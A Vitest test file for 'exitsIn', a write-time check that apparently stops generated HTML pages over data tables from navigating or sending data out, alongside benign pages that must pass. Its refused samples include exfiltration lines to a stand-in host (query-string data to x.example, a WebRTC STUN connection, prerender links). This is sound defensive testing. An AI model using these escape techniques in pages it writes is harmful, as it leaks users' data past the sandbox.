import { describe, expect, it } from "vitest";

import { exitsIn } from "./htmlpage.js";

const script = (code: string): string => `<script>${code}</script>`;

/**
 * The write-time check of a page's way out. It has to refuse every way of
 * writing a navigation it can see, and let an ordinary page through: one that
 * says "location" in its words, or has a variable or a field by that name.
 */
describe("a page's ways out", () => {
  it("refuses navigation however it is written", () => {
    for (const html of [
      script("location.href = 'https://x.example/?d=' + data"),
      script("location = 'https://x.example'"),
      script("location.assign(u)"),
      script("window.location.replace(u)"),
      script("document.location = u"),
      script("self['location'] = u"),
      script("top.location.href = u"),
      script("globalThis.location.hash = u"),
      script("window.open('https://x.example')"),
      script("open('https://x.example')"),
      script("const a = document.createElement('a'); a.href = 'https://x.example'; a.target = '_blank'; a.click()"),
      script("a.setAttribute('href', 'https://x.example'); a.click()"),
      script('a.setAttribute("target", "_blank")'),
      script("el.setAttributeNS(null, 'href', u)"),
      script("new RTCPeerConnection({ iceServers: [{ urls: 'stun:x.example' }] })"),
      script("new webkitRTCPeerConnection({})"),
      script("document.querySelector('form').submit()"),
      script("navigation.navigate(u)"),
      // Code hidden after a regex literal that holds a quote is still read as code.
      script("const q = /'/; location.href = u; const r = /'/"),
      // And inside a template's expression.
      script("const s = `${(location.href = u)}`"),
      '<button onclick="location.assign(1)">go</button>',
      '<a href="javascript:location=1">x</a>',
      '<a href="https://x.example">x</a>',
      '<a href="//x.example">x</a>',
      '<a href="mailto:a@x.example">x</a>',
      '<link rel="prerender" href="https://x.example">',
      '<x:link xmlns:x="http://www.w3.org/1999/xhtml" rel="prerender" href="https://x.example"/>',
    ]) {
      expect(exitsIn(html), html).not.toEqual([]);
    }
  });

  it("lets ordinary words and code through", () => {
    for (const html of [
      "<p>Pick a location. Fill the form below, then open the list.</p>",
      script("const location = rows[0].location; render(location)"),
      script("rows.map((r) => r.location).join(', ')"),
      script("const label = 'Set location = home'; // location.href would be wrong here"),
      script("/* window.open(x) */ const opened = isOpen(1)"),
      script("const target = document.body; if (x == location) {}"),
      script("function open(row) { return row } class Panel { open() { } }"),
      script("el.setAttribute('aria-label', 'Open location')"),
      script("const re = /location\\.href/; const t = `at ${place.location}`"),
      '<a href="#totals">Totals</a>',
      '<img src="data:image/png;base64,AA" alt="">',
    ]) {
      expect(exitsIn(html), html).toEqual([]);
    }
  });

  /* Pages as KOS writes them, over tables with location columns. */
  it("lets realistic React and chart pages through", () => {
    const react = script(`
      const { useState, useEffect } = React;
      function Row({ row }) {
        let { location, amount } = row;
        location = location.trim() || "Unknown";
        return h("tr", null, h("td", null, location), h("td", null, amount));
      }
      function open(id) { setSelected(id); }
      function App() {
        const [rows, setRows] = useState([]);
        useEffect(() => { kos.query("SELECT location, amount FROM trips_legs").then((r) => setRows(r.rows)); }, []);
        return h("table", { onClick: () => open(rows[0].id) }, rows.map((row) => h(Row, { row })));
      }
      ReactDOM.createRoot(document.getElementById("root")).render(h(App));`);
    const chart = script(`
      const goal = { target: 0, action: "none" };
      goal.target = 500;
      const config = {};
      config.action = "zoom";
      config.href = undefined;
      kos.query("SELECT location, COUNT(*) AS n FROM trips_legs GROUP BY 1").then(({ rows }) => {
        KosCharts.bar(document.getElementById("c"), rows.map(({ location, n }) => ({ label: location, value: n })));
      });
      const open = (panel) => panel.classList.add("open");
      open(document.querySelector(".panel"));`);
    for (const html of [`<div id="root"></div>${react}`, `<div id="c" class="kos-chart"></div><div class="panel"></div>${chart}`]) {
      expect(exitsIn(html), html).toEqual([]);
    }
  });

  it("still refuses the same names when they are the window's and the link's", () => {
    for (const html of [
      script("const a = document.createElement('a'); a.href = u; a.click()"),
      `<a id="x">x</a>${script("document.getElementById('x').target = '_blank'")}`,
      script("const row = rows[0]; location = row.url"),
      script("open(row.url)"),
    ]) {
      expect(exitsIn(html), html).not.toEqual([]);
    }
  });
});
